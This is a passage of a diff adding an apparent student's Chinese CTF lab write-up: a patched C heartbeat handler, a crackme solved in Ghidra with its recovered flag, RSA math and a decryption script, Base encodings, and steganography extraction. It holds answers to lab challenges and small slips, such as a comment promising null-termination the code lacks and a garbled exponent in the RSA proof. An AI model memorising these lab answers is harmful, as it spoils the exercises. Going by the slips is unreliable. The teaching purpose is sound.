+    if (tmp-&gt;size &lt; sizeof(struct hbpkt) || tmp-&gt;size &gt; 0x1000)
+        return NULL;
+
+    // 计算要读取的 data 长度
+    uint32_t data_len = tmp-&gt;size - sizeof(struct hbpkt);
+
+    // 读取 data 部分
+    if (fread(tmp-&gt;data, 1, data_len, stdin) != data_len)
+        return NULL;
+
+    // 修复2 &amp; 3：使用 data_len 而不是 strlen
+    // - 不依赖 '\0' 结尾
+    // - real_size 精确等于 tmp-&gt;size，不会越界
+    uint32_t real_size = tmp-&gt;size;
+
+    // 确保 data 以 '\0' 结尾（如果调用者需要字符串操作）
+    struct hbpkt *res = calloc(1, real_size);
+    if (!res)
+        return NULL;
+
+    // 复制精确的 real_size 字节，不会越界
+    memcpy(res, buffer, real_size);
+
+    res-&gt;index += 1;
+
+    return res;
+}
+
+int reply_heart_beat(struct hbpkt *pkt)
+{
+    int err = 0;
+    int written = 0;
+
+    // 修复4：按照实际分配的大小输出，而不是信任 pkt-&gt;size
+    if (pkt-&gt;size)
+    {
+        written = fwrite(pkt, 1, pkt-&gt;size, stdout);
+        fflush(stdout);
+    }
+
+    if (written != (int)pkt-&gt;size)
+    {
+        err = -1;
+    }
+
+    return err;
+}
+
+int main()
+{
+    int err;
+    while (true)
+    {
+        struct hbpkt *p = get_heart_beat();
+        if (!p)
+            continue;
+
+        err = reply_heart_beat(p);
+
+        free(p);
+
+        if (err)
+            continue;
+    }
+}</code></pre>
+<h2 id="reverse-lab-0">Reverse Lab 0<a class="headerlink" href="#reverse-lab-0" title="Permanent link">&para;</a></h2>
+<h3 id="实验环境">实验环境<a class="headerlink" href="#实验环境" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>配置</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows 11</td>
+</tr>
+<tr>
+<td>逆向工具</td>
+<td>Ghidra 12.1.2（反汇编 / 反编译）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="前置知识">前置知识<a class="headerlink" href="#前置知识" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>知识点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>ELF 文件格式</strong></td>
+<td>Linux 下的可执行文件格式，类似 Windows 的 PE（.exe）</td>
+</tr>
+<tr>
+<td><strong>汇编语言</strong></td>
+<td>CPU 指令的低级表示，x86-64 汇编是逆向的核心基础</td>
+</tr>
+<tr>
+<td><strong>反汇编 vs 反编译</strong></td>
+<td>反汇编 = 二进制 → 汇编代码；反编译 = 二进制 → C 伪代码</td>
+</tr>
+<tr>
+<td><strong>符号表</strong></td>
+<td>记录了函数名、变量名等调试信息。<code>not stripped</code> 表示保留了符号，<code>stripped</code> 表示已移除</td>
+</tr>
+<tr>
+<td><strong>静态链接 vs 动态链接</strong></td>
+<td>静态 = 库代码打包进程序；动态 = 运行时加载 .so 文件</td>
+</tr>
+</tbody>
+</table>
+<h3 id="我的尝试_1">我的尝试<a class="headerlink" href="#我的尝试_1" title="Permanent link">&para;</a></h3>
+<h4 id="分析代码">分析代码<a class="headerlink" href="#分析代码" title="Permanent link">&para;</a></h4>
+<pre class="highlight"><code class="language-bash">strings crackme | grep -i -E "access|granted|password"</code></pre>
+<p>输出：</p>
+<pre class="highlight"><code>Enter Password (or q to quit):
+Access Denied
+Access Granted</code></pre>
+<p>从字符串可以初步判断：程序接收密码输入，比对后输出两种不同结果。</p>
+<h4 id="ghidra-分析">Ghidra 分析<a class="headerlink" href="#ghidra-分析" title="Permanent link">&para;</a></h4>
+<ol>
+<li>新建项目 → 导入 <code>crackme</code> → 自动分析</li>
+<li>在 Symbol Tree 里找到 <code>main</code> 函数，查看反编译结果</li>
+</ol>
+<pre class="highlight"><code class="language-c">banner();                        // 打印欢迎信息
+gets(buffer);                    // 读取输入
+if (strlen(buffer) == 1 &amp;&amp; buffer[0] == 'q')
+    break;                       // 按 q 退出
+if (!verify(buffer))             // 关键：verify 返回 0 才通过
+    puts("Access Granted");
+else
+    puts("Access Denied");</code></pre>
+<h4 id="逆向-verify-函数">逆向 verify 函数<a class="headerlink" href="#逆向-verify-函数" title="Permanent link">&para;</a></h4>
+<p><img alt="" src="../image-22.png" /></p>
+<pre class="highlight"><code class="language-c">_Bool verify(char *passwd) {
+    char *table[14] = {
+        "1040", "1040", "1040", "1968", "1152", "1680",
+        "1312", "1616", "1888", "1616", "1824", "1840",
+        "1616", "2000"
+    };
+
+    if (strlen(passwd) != 14)
+        return true;
+
+    for (i = 0; i &lt; 14; i++) {
+        sprintf(tmp, "%d", (int)passwd[i] &lt;&lt; 4); 
+        if (strcmp(tmp, table[i]) != 0)   
+            return true;                    
+    }
+    return false;     
+}</code></pre>
+<h4 id="密码还原">密码还原<a class="headerlink" href="#密码还原" title="Permanent link">&para;</a></h4>
+<pre class="highlight"><code>table[i] = passwd[i] × 16
+所以：passwd[i] = table[i] ÷ 16
+→ AAA{HiReverse}</code></pre>
+<p>在 Linux 环境下执行得到 "Access Granted"</p>
+<p><img alt="" src="../image-23.png" /></p>
+<h2 id="crypto-lab-0">Crypto Lab 0<a class="headerlink" href="#crypto-lab-0" title="Permanent link">&para;</a></h2>
+<h3 id="crypto-hack">Crypto Hack<a class="headerlink" href="#crypto-hack" title="Permanent link">&para;</a></h3>
+<h4 id="question-1-greatest-common-divisor">Question 1: Greatest Common Divisor<a class="headerlink" href="#question-1-greatest-common-divisor" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>辗转相除法，原理很简单，直接放代码了</p>
+</blockquote>
+<pre class="highlight"><code class="language-python">def gcd(a, b):
+    a, b = abs(a), abs(b)
+    while b != 0:
+        a, b = b, a % b
+    return a
+
+
+x = int(input("请输入第一个整数: "))
+y = int(input("请输入第二个整数: "))
+print("最大公约数:", gcd(x, y))</code></pre>
+<h4 id="question-2-extended-gcd">Question 2: Extended GCD<a class="headerlink" href="#question-2-extended-gcd" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>离散数学学过，知识点有写在注释里</p>
+</blockquote>
+<pre class="highlight"><code class="language-python">def extended_gcd(a, b):
+    # 终止条件：b = 0, 最大公约数就是|a|，此时有a*1 + b*0 = a
+    if b == 0:
+        return abs(a), 1 if a &gt;= 0 else -1, 0
+    # 递归调用：extended_gcd(b, a % b)，得到gcd(b, a % b)以及对应的系数x1, y1
+    g, x1, y1 = extended_gcd(b, a % b)
+    x = y1
+    y = x1 - (a // b) * y1
+    return g, x, y
+
+
+x = int(input("请输入第一个整数: "))
+y = int(input("请输入第二个整数: "))
+g, x, y = extended_gcd(x, y)
+print(g, x, y)</code></pre>
+<h4 id="question-3--4-modular-arithmetic">Question 3 &amp; 4: Modular Arithmetic<a class="headerlink" href="#question-3--4-modular-arithmetic" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>Q3可能是考察同余符号嘛qwq</p>
+</blockquote>
+<pre class="highlight"><code class="language-python">x = 11 % 6
+y = 8146798528947 % 17
+
+print(x, y)</code></pre>
+<blockquote>
+<p>Q4费马小定理：如果p是素数，且整数a不被p整除，则有 a^(p-1) ≡ 1 (mod p)（离散数学同样讲过qwq）</p>
+</blockquote>
+<h4 id="question-5-modular-inverting">Question 5: Modular Inverting<a class="headerlink" href="#question-5-modular-inverting" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>求解逆元的过程其实就是 Q2 Extended GCD 的应用，原理也很简单，不再赘述</p>
+</blockquote>
+<p><img alt="" src="../image-24.png" /></p>
+<h3 id="rsa-算法">RSA 算法<a class="headerlink" href="#rsa-算法" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>很大程度地参考了wiki上关于RSA加密算法的解释 https://zh.wikipedia.org/wiki/RSA%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95</p>
+</blockquote>
+<h4 id="1-公钥与私钥的产生">1. 公钥与私钥的产生<a class="headerlink" href="#1-公钥与私钥的产生" title="Permanent link">&para;</a></h4>
+<p>假设 Alice 想要通过不可靠的媒体接收 Bob 的私人消息。她可以用以下的方式来产生一个<strong>公钥</strong>和一个<strong>私钥</strong>：</p>
+<ol>
+<li>
+<p><strong>选择素数</strong>：随意选择两个大的素数 <span class="arithmatex">\(p\)</span> 和 <span class="arithmatex">\(q\)</span>，<span class="arithmatex">\(p \neq q\)</span>，计算：</p>
+<div class="arithmatex">\[N = pq\]</div>
+</li>
+<li>
+<p><strong>计算欧拉函数</strong>：根据欧拉函数，求得 <span class="arithmatex">\(r\)</span>：</p>
+<div class="arithmatex">\[r = \varphi(N) = \varphi(p) \times \varphi(q) = (p - 1)(q - 1)\]</div>
+</li>
+<li>
+<p><strong>选择公钥指数</strong>：选择一个小于 <span class="arithmatex">\(r\)</span> 的整数 <span class="arithmatex">\(e\)</span>，使 <span class="arithmatex">\(e\)</span> 与 <span class="arithmatex">\(r\)</span> 互质。并求得 <span class="arithmatex">\(e\)</span> 关于 <span class="arithmatex">\(r\)</span> 的模逆元，命名为 <span class="arithmatex">\(d\)</span>（即求 <span class="arithmatex">\(d\)</span> 令 <span class="arithmatex">\(ed \equiv 1 \pmod r\)</span>）。</p>
+<blockquote>
+<p><em>注：模逆元存在，当且仅当 <span class="arithmatex">\(e\)</span> 与 <span class="arithmatex">\(r\)</span> 互质。</em></p>
+</blockquote>
+</li>
+<li>
+<p><strong>销毁记录</strong>：将 <span class="arithmatex">\(p\)</span> 和 <span class="arithmatex">\(q\)</span> 的记录销毁。</p>
+</li>
+</ol>
+<p>最终，<strong>(N, e) 是公钥</strong>，<strong>(N, d) 是私钥</strong>。Alice 将她的公钥 <span class="arithmatex">\((N, e)\)</span> 传给 Bob，而将她的私钥 <span class="arithmatex">\((N, d)\)</span> 藏起来。</p>
+<h4 id="2-加密消息">2. 加密消息<a class="headerlink" href="#2-加密消息" title="Permanent link">&para;</a></h4>
+<p>假设 Bob 想给 Alice 送消息 <span class="arithmatex">\(m\)</span>，他知道 Alice 产生的 <span class="arithmatex">\(N\)</span> 和 <span class="arithmatex">\(e\)</span>。</p>
+<ol>
+<li>
+<p><strong>消息转换</strong>：他使用事先与 Alice 约好的格式将 <span class="arithmatex">\(m\)</span> 转换为一个小于 <span class="arithmatex">\(N\)</span> 的非负整数 <span class="arithmatex">\(n\)</span>。例如：他可以将每一个字转换为这个字的 Unicode 码，然后将这些数字连在一起组成一个数字。</p>
+</li>
+<li>
+<p><strong>加密公式</strong>：用下面这个公式他可以将 <span class="arithmatex">\(n\)</span> 加密为 <span class="arithmatex">\(c\)</span>：</p>
+<div class="arithmatex">\[c = n^e \pmod N\]</div>
+</li>
+</ol>
+<p>这里的 <span class="arithmatex">\(c\)</span> 可以用<strong>模幂算法</strong>快速求出来。Bob 算出 <span class="arithmatex">\(c\)</span> 后就可以把它传递给 Alice。</p>
+<h4 id="3-解密消息">3. 解密消息<a class="headerlink" href="#3-解密消息" title="Permanent link">&para;</a></h4>
+<p>Alice 得到 Bob 的消息 <span class="arithmatex">\(c\)</span> 后就可以利用她的密钥 <span class="arithmatex">\(d\)</span> 来解码：</p>
+<div class="arithmatex">\[n = c^d \pmod N\]</div>
+<p>与 Bob 计算 <span class="arithmatex">\(c\)</span> 类似，这里的 <span class="arithmatex">\(n\)</span> 也可以用<strong>模幂算法</strong>快速求出。得到 <span class="arithmatex">\(n\)</span> 后，她可以将原来的信息 <span class="arithmatex">\(m\)</span> 重新复原。</p>
+<h4 id="4-解码原理与证明">4. 解码原理与证明<a class="headerlink" href="#4-解码原理与证明" title="Permanent link">&para;</a></h4>
+<p>解码的原理是基于以下同余等式：</p>
+<div class="arithmatex">\[c^d \equiv (n^e)^d \equiv n^{ed} \pmod N\]</div>
+<p>已知 <span class="arithmatex">\(ed \equiv 1 \pmod r\)</span>，即 <span class="arithmatex">\(ed = 1 + h\varphi(N)\)</span>（其中 <span class="arithmatex">\(h\)</span> 为整数）。那么有：</p>
+<div class="arithmatex">\[n^{ed} = n^{1 + h\varphi(N)} = n \cdot n^{h\varphi(N)} = n\left(n\varphi(N)\right)^h\]</div>
+<p>为了证明 <span class="arithmatex">\(n^{ed} \equiv n \pmod N\)</span>，分两种情况讨论：</p>
+<ul>
+<li>
+<p><strong>情况一：若 <span class="arithmatex">\(n\)</span> 与 <span class="arithmatex">\(N\)</span> 互素</strong></p>
+<p>由<strong>欧拉定理</strong>可得 <span class="arithmatex">\(n\varphi(N) \equiv 1 \pmod N\)</span>，因此：</p>
+<div class="arithmatex">\[n^{ed} \equiv n\left(n\varphi(N)\right)^h \equiv n(1)^h \equiv n \pmod N\]</div>
+</li>
+<li>
+<p><strong>情况二：若 <span class="arithmatex">\(n\)</span> 与 <span class="arithmatex">\(N\)</span> 不互素</strong></p>
+<p>由于 <span class="arithmatex">\(N = pq\)</span> 且 <span class="arithmatex">\(p, q\)</span> 为不同的素数，不失一般性，可设 <span class="arithmatex">\(n = ph\)</span>（即 <span class="arithmatex">\(n\)</span> 是 <span class="arithmatex">\(p\)</span> 的倍数，且 <span class="arithmatex">\(\gcd(n, q) = 1\)</span>）。同时由 <span class="arithmatex">\(ed - 1 = k(q - 1)\)</span>（其中 <span class="arithmatex">\(k\)</span> 为整数），得：</p>
+<ol>
+<li>
+<p><strong>对于模 <span class="arithmatex">\(p\)</span></strong>：</p>
+<div class="arithmatex">\[n^{ed} = (ph)^{ed} \equiv 0 \equiv ph \equiv n \pmod p\]</div>
+</li>
+<li>
+<p><strong>对于模 <span class="arithmatex">\(q\)</span></strong>：</p>
+<div class="arithmatex">\[n^{ed} = n^{ed-1}n = n^{k(q-1)}n = (n^{q-1})^kn \equiv 1^kn \equiv n \pmod q\]</div>
+</li>
+</ol>
+<p>由于 <span class="arithmatex">\(p\)</span> 和 <span class="arithmatex">\(q\)</span> 是互质的素数，根据<strong>中国剩余定理</strong>，由 <span class="arithmatex">\(n^{ed} \equiv n \pmod p\)</span> 和 <span class="arithmatex">\(n^{ed} \equiv n \pmod q\)</span> 可得：</p>
+<div class="arithmatex">\[n^{ed} \equiv n \pmod N\]</div>
+</li>
+</ul>
+<p><strong>故 <span class="arithmatex">\(n^{ed} \equiv n \pmod N\)</span> 得证。</strong></p>
+<h4 id="rsa-代码实现">RSA 代码实现<a class="headerlink" href="#rsa-代码实现" title="Permanent link">&para;</a></h4>
+<pre class="highlight"><code class="language-python">p = 0x848cc7edca3d2feef44961881e358cbe924df5bc0f1e7178089ad6dc23fa1eec7b0f1a8c6932b870dd53faf35b22f35c8a7a0d130f69e53a91d0330c0af2c5ab
+q = 0xa0ac7bcd3b1e826fdbd1ee907e592c163dea4a1a94eb03fd4d3ce58c2362100ec20d96ad858f1a21e8c38e1978d27cd3ab833ee344d8618065c003d8ffd0b1cb
+n = p * q
+print(n)
+r = (p - 1) * (q - 1)
+# 选择一个小于r的整数e，使e与r互质，求解e关于r的模逆元d
+# 普遍选择65537（即0x10001）
+e = 0x10001
+# pow(base, exponent, modulus)函数可以计算base的exponent次方对modulus取模的结果，同时也可以用来求解模逆元
+d = pow(e, -1, r)
+
+print(f"公钥（n,e）: ({n}, {e})")
+print(f"私钥（n,d）: ({n}, {d})")
+
+message = "Hatsune Miku"
+m = int.from_bytes(message.encode(), byteorder='big')
+
+if m &gt;= n:
+    raise ValueError("错误：明文大整数 m 超过了限制范围 N，请更换更大的质数 p 和 q！")
+
+# 加密过程
+c = pow(m, e, n)
+print(f"密文 c: {c}")
+
+# 解密过程
+m_decrypted = pow(c, d, n)
+print(int.to_bytes(m_decrypted, (m_decrypted.bit_length() + 7) // 8, 'big'))</code></pre>
+<h4 id="lab-0-rsa-题目解答">Lab 0 RSA 题目解答<a class="headerlink" href="#lab-0-rsa-题目解答" title="Permanent link">&para;</a></h4>
+<pre class="highlight"><code class="language-python"># 已知p和q，计算出n，然后计算出r，最后计算出d，然后就可以解密了
+p = 0x848cc7edca3d2feef44961881e358cbe924df5bc0f1e7178089ad6dc23fa1eec7b0f1a8c6932b870dd53faf35b22f35c8a7a0d130f69e53a91d0330c0af2c5ab
+q = 0xa0ac7bcd3b1e826fdbd1ee907e592c163dea4a1a94eb03fd4d3ce58c2362100ec20d96ad858f1a21e8c38e1978d27cd3ab833ee344d8618065c003d8ffd0b1cb
+n = p * q
+e = 0x10001
+c = 0x39f68bd43d1433e4fcbbe8fc0063661c97639324d63e67dedb6f4ed4501268571f128858b2f97ee7ce0407f24320a922787adf4d0233514934bbd7e81e4b4d07b423949c85ae3cc172ea5bcded917b5f67f18c2c6cd1b2dd98d7db941697ececdfc90507893579081f7e3d5ddeb9145a715abc20c4a938d32131013966bea539
+r = (p - 1) * (q - 1)
+d = pow(e, -1, r)
+m = pow(c, d, n)
+print(int.to_bytes(m, (m.bit_length() + 7) // 8, 'big'))</code></pre>
+<p><img alt="" src="../image-11.png" /></p>
+<h2 id="misc-lab-0">Misc Lab 0<a class="headerlink" href="#misc-lab-0" title="Permanent link">&para;</a></h2>
+<h3 id="base-系列编码">Base 系列编码<a class="headerlink" href="#base-系列编码" title="Permanent link">&para;</a></h3>
+<h4 id="什么是-base-系列编码">什么是 Base 系列编码？<a class="headerlink" href="#什么是-base-系列编码" title="Permanent link">&para;</a></h4>
+<ul>
+<li><strong>核心本质</strong>：它不是加密算法，而是一种编码机制（或者说"文本数据表示法"）。</li>
+<li><strong>为什么需要它？</strong> 计算机中很多传输通道（如邮件、早期的网页、URL）只支持传输纯文本（可视的 ASCII 字符）。如果直接传输图片、视频或复杂的二进制字节码，有些特殊字符（如换行符、控制字符）可能会被路由器或协议误吞或篡改。</li>
+<li><strong>解决方案</strong>：把任意的二进制数据（包含不可见字符），映射到一组安全的、人类可见的字符集（如英文字母、数字）中进行传输。</li>
+</ul>
+<h4 id="核心分类">核心分类<a class="headerlink" href="#核心分类" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">编码名称</th>
+<th style="text-align: left;">字符集大小</th>
+<th style="text-align: left;">包含的典型字符</th>
+<th style="text-align: left;">末尾特征</th>
+<th style="text-align: left;">常见应用场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Base16</strong></td>
+<td style="text-align: left;">16</td>
+<td style="text-align: left;"><code>0-9</code>, <code>A-F</code> (即十六进制)</td>
+<td style="text-align: left;">无</td>
+<td style="text-align: left;">MD5/SHA 摘要结果展示、真彩颜色值</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Base32</strong></td>
+<td style="text-align: left;">32</td>
+<td style="text-align: left;"><code>A-Z</code>, <code>2-7</code></td>
+<td style="text-align: left;">经常有 <code>=</code></td>
+<td style="text-align: left;">某些特定的密钥交换、BT 种子磁力链接</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Base58</strong></td>
+<td style="text-align: left;">58</td>
+<td style="text-align: left;">去掉了易混淆的 <code>0</code>, <code>O</code>, <code>I</code>, <code>l</code> 以及 <code>+</code>, <code>/</code></td>
+<td style="text-align: left;">无 <code>=</code></td>
+<td style="text-align: left;"><strong>区块链/比特币（Bitcoin）</strong> 地址</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Base64</strong></td>
+<td style="text-align: left;">64</td>
+<td style="text-align: left;"><code>A-Z</code>, <code>a-z</code>, <code>0-9</code>, <code>+</code>, <code>/</code></td>
+<td style="text-align: left;">常见 <code>=</code> 或 <code>==</code></td>
+<td style="text-align: left;">网页图片内嵌、邮件附件传输 (MIME)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>URL Base64</strong></td>
+<td style="text-align: left;">64</td>
+<td style="text-align: left;">把 <code>+</code> 和 <code>/</code> 替换为了 <code>-</code> 和 <code>_</code></td>
+<td style="text-align: left;">通常去掉 <code>=</code></td>
+<td style="text-align: left;">把参数安全地放在 URL 链接中传输</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Base85/Ascii85</strong></td>
+<td style="text-align: left;">85</td>
+<td style="text-align: left;">包含大量英文标点符号 (如 <code>;</code>, <code>&lt;</code>, <code>!</code>, <code>@</code>)</td>
+<td style="text-align: left;">视变体而定</td>
+<td style="text-align: left;">PDF文件压缩、Git 内部数据存储</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>根据上述表格中的特征可以判断出每个步骤用哪种 base 编码形式进行解码~</p>
+</blockquote>
+<h4 id="核心原理以-base64-为例">核心原理（以 Base64 为例）<a class="headerlink" href="#核心原理以-base64-为例" title="Permanent link">&para;</a></h4>
+<ol>
+<li><strong>二进制分组</strong>：计算机中 1 个字节 = 8 个比特（bit）。Base64 每次取 <strong>3个字节</strong>（即 <span class="arithmatex">\(3 \times 8 = 24\)</span> 个比特）。</li>
+<li><strong>重新切分</strong>：将这 24 个比特重新切分成 <strong>4个小组</strong>，每组 6 个比特（<span class="arithmatex">\(4 \times 6 = 24\)</span>）。</li>
+<li><strong>查表映射</strong>：6 个比特的取值范围是 <span class="arithmatex">\(0 \sim 63\)</span>（共 <span class="arithmatex">\(2^6 = 64\)</span> 个可能）。刚好对应 Base64 的字符表：<code>A-Z</code>、<code>a-z</code>、<code>0-9</code>、<code>+</code>、<code>/</code>。</li>
+<li><strong>末尾补位（Padding）</strong>：如果最后一组数据不够 3 个字节怎么办？<ul>
+<li>剩 2 字节：转成 3 个 Base64 字符，末尾补 1 个 <code>=</code></li>
+<li>剩 1 字节：转成 2 个 Base64 字符，末尾补 2 个 <code>=</code></li>
+<li><em>这也是为什么Base64经常结尾有 <code>=</code> 的原因。</em></li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<p><strong>空间代价</strong>：因为 3 字节变成了 4 字节，所以 Base64 编码后，<strong>文件体积会膨胀约 33%</strong>。</p>
+</blockquote>
+<h4 id="challenge-1-解题">Challenge 1 解题<a class="headerlink" href="#challenge-1-解题" title="Permanent link">&para;</a></h4>
+<p><img alt="" src="../form-image-10.png" /></p>
+<h3 id="lsb-隐写--文件附加隐写">LSB 隐写 &amp; 文件附加隐写<a class="headerlink" href="#lsb-隐写--文件附加隐写" title="Permanent link">&para;</a></h3>
+<h4 id="challenge-2-解题">Challenge 2 解题<a class="headerlink" href="#challenge-2-解题" title="Permanent link">&para;</a></h4>
+<p><img alt="" src="../form-image-12.png" /></p>
+<p><img alt="" src="../form-image-13.png" /></p>
+<p><img alt="" src="../form-image-14.png" /></p>
+<blockquote>
+<p>上述破译图片来自 https://www.aperisolve.com/</p>
+</blockquote>
+<h4 id="lsb-隐写原理">LSB 隐写原理<a class="headerlink" href="#lsb-隐写原理" title="Permanent link">&para;</a></h4>
+<p><strong>LSB 隐写</strong>（最低有效位隐写）是一种将秘密信息藏在图片像素里的技术。它的最大特点是<strong>肉眼不可识别</strong>但是<strong>不抗压缩</strong>。</p>
+<ol>
+<li>
+<p><strong>核心原理：改动"最不重要"的那一位</strong></p>
+<ul>
+<li>计算机用 <strong>8位二进制</strong>（如 <code>10110100</code>）来表示红、绿、蓝通道的颜色深浅（<span class="arithmatex">\(0 \sim 255\)</span>）。</li>
+<li><strong>最低有效位（LSB）</strong> 指的是二进制的<strong>最后一位</strong>。</li>
+<li>如果把最后一位从 <code>0</code> 改成 <code>1</code>，颜色的数值仅仅改变了 1。这种极其微弱的色差，人类肉眼绝对无法察觉。</li>
+</ul>
+</li>
+<li>
+<p><strong>隐写与提取过程</strong></p>
+<ul>
+<li><strong>隐写过程</strong>：把秘密信息拆成二进制的 <code>0</code> 和 <code>1</code>，依次替换掉图片中每个像素通道的最后一位（即变成黑色或白色）。</li>
+<li><strong>读取过程</strong>：用工具（如 StegSolve）把图片所有像素通道的最后一位依次提取出来，重新组合，就能拼回原始的秘密文本。</li>
+</ul>
+</li>
+</ol>
+<h4 id="文件附加隐写">文件附加隐写<a class="headerlink" href="#文件附加隐写" title="Permanent link">&para;</a></h4>
+<p><img alt="" src="../form-image-15.png" /></p>
+<blockquote>
+<p>依旧来自 https://www.aperisolve.com/</p>
+</blockquote>
+<p><strong>文件附加隐写</strong>（文件拼接）是指将秘密文本或文件，<strong>强行粘贴在正常图片的数据末尾</strong>。因为操作系统读到图片的"结束标记"就会停止渲染，所以多余的数据在肉眼下是完全隐形的。</p>
+<h5 id="常见文件头尾">常见文件头/尾<a class="headerlink" href="#常见文件头尾" title="Permanent link">&para;</a></h5>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">图片格式</th>
+<th style="text-align: left;">常见文件头</th>
+<th style="text-align: left;">常见文件尾</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>PNG</strong></td>
+<td style="text-align: left;"><code>89 50 4E 47 ...</code> (包含 <code>PNG</code>)</td>
+<td style="text-align: left;"><strong><code>49 45 4E 44 AE 42 60 82</code> (即 <code>IEND</code>)</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>JPG</strong></td>
+<td style="text-align: left;"><code>FF D8 FF</code></td>
+<td style="text-align: left;"><strong><code>FF D9</code></strong></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>ZIP</strong></td>
+<td style="text-align: left;"><code>50 4B 03 04</code> (即 <code>PK</code>)</td>
+<td style="text-align: left;"><code>50 4B 05 06</code></td>
+</tr>
+</tbody>
+</table>
+<h5 id="提取方法">提取方法<a class="headerlink" href="#提取方法" title="Permanent link">&para;</a></h5>
+<ol>
+<li><strong>尾部观察</strong>：直接用记事本、十六进制编辑器（如 010 Editor）打开图片，拉到<strong>最底部</strong>。在标准的结束标记（如 <code>IEND</code>）后面，经常能直接看到 Flag。</li>
+<li><strong>自动化分离</strong>：如果文件尾部藏的不是文本，而是另一个压缩包，在 Linux 下直接使用：
+    <pre class="highlight"><code>binwalk -e image.png</code></pre></li>
+</ol>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="页脚" >
+        
+          
+          <a href="../" class="md-footer__link md-footer__link--prev" aria-label="上一页: CTF 目录">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                上一页
+              </span>
+              <div class="md-ellipsis">
+                CTF 目录
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../Crypto%20Lab%201/" class="md-footer__link md-footer__link--next" aria-label="下一页: Crypto">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                下一页
+              </span>
+              <div class="md-ellipsis">
+                Crypto
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2026 Jiucheng
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.top", "navigation.indexes", "navigation.tracking", "navigation.footer", "navigation.instant", "navigation.instant.prefetch", "navigation.instant.progress", "content.action.edit", "content.code.annotate", "content.code.copy", "content.code.select", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../../theme/js/theme-sync.js"></script>
+      
+        <script src="../../../theme/js/mathjax.js"></script>
+      
+        <script src="../../../theme/js/hljs/highlight.min.js"></script>
+      
